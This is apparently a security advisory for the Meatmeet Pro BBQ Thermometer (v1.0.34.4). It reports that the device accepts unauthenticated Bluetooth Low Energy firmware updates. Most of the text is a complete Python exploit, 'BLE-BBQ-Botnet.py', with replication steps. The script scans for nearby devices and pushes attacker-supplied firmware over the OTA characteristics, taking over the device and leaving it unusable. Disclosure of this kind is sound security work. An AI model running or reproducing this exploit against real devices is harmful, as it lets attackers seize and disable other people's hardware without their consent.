### Affected Entity
- Meatmeet Pro BBQ Thermometer v1.0.34.4

### Impact 
An unauthenticated attacker within proximity of the Meatmeet device can perform an unauthorized Over The Air (OTA) firmware upgrade using Bluetooth Low Energy (BLE), resulting in the firmware on the device being overwritten with the attacker's code. As the device does not perform checks on upgrades, this results in Remote Code Execution (RCE) and the victim losing complete access to the Meatmeet.

### References 
- CWE-306: Missing Authentication for Critical Function
- CWE-494: Download of Code Without Integrity Check
- CWE-345: Insufficient Verification of Data Authenticity


### Replication Steps
1. Save the Python script locally.
2. Write custom firmware for an ESP32-C3 chip.
3. While near a Meatmeet, run the Python script.
4. Select the device with the name MEBOX01 in the identifer after the BLE scan has completed.
5. In the terminal run: start_ota
6. Provide the path to the custom firmware image.
7. Allow for the firmware upgrade to complete.
8. Once completed, type the following in the terminal: end_ota

**Results**

The Meatmeet thermometer base station will restart and execute whatever code was uploaded over BLE. The device can no longer function as intended and the custom code has executed. 


**BLE-BBQ-Botnet.py**
```
import asyncio
import os
from bleak import BleakScanner, BleakClient

# BLE UUIDs from HubOtaManager.smali
OTA_SERVICE_UUID = "0000f5a0-0000-1000-8000-00805f9b34fb"
OTA_CONTROL_UUID = "f7bf3564-fb6d-4e53-88a4-5e37e0326063"
OTA_DATA_UUID = "984227f3-34fc-4045-a5d0-2c581f81a153"
INITIAL_MTU = 247  # Preferred MTU
DEFAULT_MTU = 200  # Fallback MTU
OTA_CONTROL_START_DELAY = 0.2  # 200ms
OTA_CONTROL_END_DELAY = 0.5   # 500ms

# OTA Commands
COMMANDS = {
    "check_ota": {
        "type": "check",
        "uuid": OTA_SERVICE_UUID,
        "description": "Check OTA service and characteristics"
    },
    "start_ota": {
        "type": "write",
        "uuid": OTA_CONTROL_UUID,
        "payload": bytearray([0x00]),
        "description": "Start OTA firmware update"
    },
    "send_firmware": {
        "type": "write",
        "uuid": OTA_DATA_UUID,
        "prompt": ["firmware_file"],
        "description": "Send firmware file in chunks (run 'start_ota' first)"
    },
    "end_ota": {
        "type": "write",
        "uuid": OTA_CONTROL_UUID,
        "payload": bytearray([0x03]),
        "description": "End OTA firmware update"
    }
}

async def scan_for_ble():
    print("Scanning for BLE devices (5s)...")
    devices = await BleakScanner.discover(timeout=5.0)
    if not devices:
        print("[-] No devices found.")
        return None
    for i, device in enumerate(devices):
        name = device.name or "Unknown"
        print(f"[{i}] {name} ({device.address})")
    while True:
        try:
            choice = input("Select device (number): ").strip()
            if choice.isdigit() and 0 <= int(choice) < len(devices):
                return devices[int(choice)].address
            print("Invalid selection.")
        except KeyboardInterrupt:
            print("\n[-] Aborted.")
            return None

def print_help():
    print("\nCommands:")
    for cmd, meta in sorted(COMMANDS.items()):
        print(f"  {cmd}: {meta['description']}")
    print("  help: Show this help")
    print("  exit/quit: Disconnect and exit")
    print("\nNote: Run 'check_ota', 'start_ota', 'send_firmware' (prompts for .bin/.gbl path), then 'end_ota'.")

def print_available_characteristics(client):
    print("\n[+] GATT Services and Characteristics:")
    notify_indicate_chars = []
    ota_service_found = False
    for service in client.services:
        print(f"  [Service] {service.uuid}")
        if service.uuid == OTA_SERVICE_UUID:
            ota_service_found = True
        for char in service.characteristics:
            props = ', '.join(char.properties)
            print(f"    └── [Char] {char.uuid} (Handle: {char.handle}, {props})")
            if 'notify' in char.properties or 'indicate' in char.properties:
                notify_indicate_chars.append((char.uuid, char.handle))
    return notify_indicate_chars, ota_service_found

def notification_handler(sender, data):
    try:
        hex_data = data.hex()
        ascii_data = data.decode(errors='ignore')
        char_uuid = sender_uuid.get(sender, "Unknown UUID")
        if len(data) == 1 and data[0] == 0x01:
            print(f"[Notification/Indication] OTA Success from {char_uuid} (Handle: {sender}): Hex={hex_data}")
        elif len(data) == 1 and data[0] in (0xFF, 0x02, 0x03):
            print(f"[Notification/Indication] OTA Failure from {char_uuid} (Handle: {sender}): Hex={hex_data}")
        else:
            print(f"[Notification/Indication] OTA Status from {char_uuid} (Handle: {sender}): ASCII={ascii_data}, Hex={hex_data}")
    except Exception as e:
        hex_data = data.hex()
        print(f"[Notification/Indication Error] from {sender_uuid.get(sender, 'Unknown UUID')} (Handle: {sender}): {e}, Hex={hex_data}")

async def interact_with_device(address):
    async with BleakClient(address, timeout=20.0) as client:
        print(f"[*] Connected to {address}")

        # Get MTU (triggers _acquire_mtu() in BlueZ backend)
        try:
            mtu = client.mtu_size
            if mtu < 23:
                print(f"[!] MTU {mtu} too low, using default {DEFAULT_MTU}")
                mtu = DEFAULT_MTU
            else:
                print(f"[*] MTU set to {mtu}")
        except AttributeError:
            print(f"[!] MTU unavailable, using default {DEFAULT_MTU}")
            mtu = DEFAULT_MTU

        # Subscribe to all notify/indicate characteristics
        notify_indicate_chars, ota_service_found = print_available_characteristics(client)
        global sender_uuid
        sender_uuid = {}
        for uuid, handle in notify_indicate_chars:
            try:
                await client.start_notify(uuid, notification_handler)
                sender_uuid[handle] = uuid
                print(f"[*] Notifications/Indications enabled on {uuid} (Handle: {handle})")
            except Exception as e:
                print(f"[!] Failed to enable notifications on {uuid} (Handle: {handle}): {e}")

        print("Connected. Type 'help' for commands.")
        while True:
            try:
                user_input = input("> ").strip().lower()
                if not user_input:
                    continue
                if user_input in ("exit", "quit"):
                    break
                if user_input == "help":
                    print_help()
                    continue

                cmd_meta = COMMANDS.get(user_input)
                if not cmd_meta:
                    print("[!] Unknown command. Type 'help'.")
                    continue

                if cmd_meta["type"] == "check":
                    if ota_service_found:
                        control_found = any(char.uuid == OTA_CONTROL_UUID for char in client.services.get_service(OTA_SERVICE_UUID).characteristics)
                        data_found = any(char.uuid == OTA_DATA_UUID for char in client.services.get_service(OTA_SERVICE_UUID).characteristics)
                        print(f"[*] OTA Check: Service={ota_service_found}, Control={control_found}, Data={data_found}")
                    else:
                        print("[-] OTA Service not found.")
                    continue

                if "prompt" in cmd_meta:
                    file_path = input("Firmware file path (e.g., firmware.bin): ").strip()
                    if not os.path.exists(file_path):
                        print("[-] File not found.")
                        continue
                    with open(file_path, 'rb') as f:
                        firmware_data = f.read()
                    chunk_size = mtu - 3
                    total_chunks = (len(firmware_data) + chunk_size - 1) // chunk_size
                    for i in range(0, len(firmware_data), chunk_size):
                        chunk = firmware_data[i:i + chunk_size]
                        if len(chunk) % 4 != 0:
                            chunk += b'\xFF' * (4 - len(chunk) % 4)
                        await client.write_gatt_char(cmd_meta["uuid"], chunk, response=False)
                        print(f"[*] Sent chunk {i // chunk_size + 1}/{total_chunks}")
                        await asyncio.sleep(0.1)
                    continue

                await client.write_gatt_char(cmd_meta["uuid"], cmd_meta["payload"], response=False)
                print("[*] Command sent.")
                if user_input == "start_ota":
                    await asyncio.sleep(OTA_CONTROL_START_DELAY)
                elif user_input == "end_ota":
                    await asyncio.sleep(OTA_CONTROL_END_DELAY)
            except Exception as e:
                print(f"Error: {e}")

        for uuid, handle in notify_indicate_chars:
            try:
                await client.stop_notify(uuid)
                print(f"[*] Notifications stopped on {uuid} (Handle: {handle})")
            except Exception as e:
                print(f"[!] Failed to stop notifications on {uuid} (Handle: {handle}): {e}")
        print("Disconnected.")

async def main():
    address = await scan_for_ble()
    if address:
        await interact_with_device(address)

if __name__ == "__main__":
    asyncio.run(main())
```
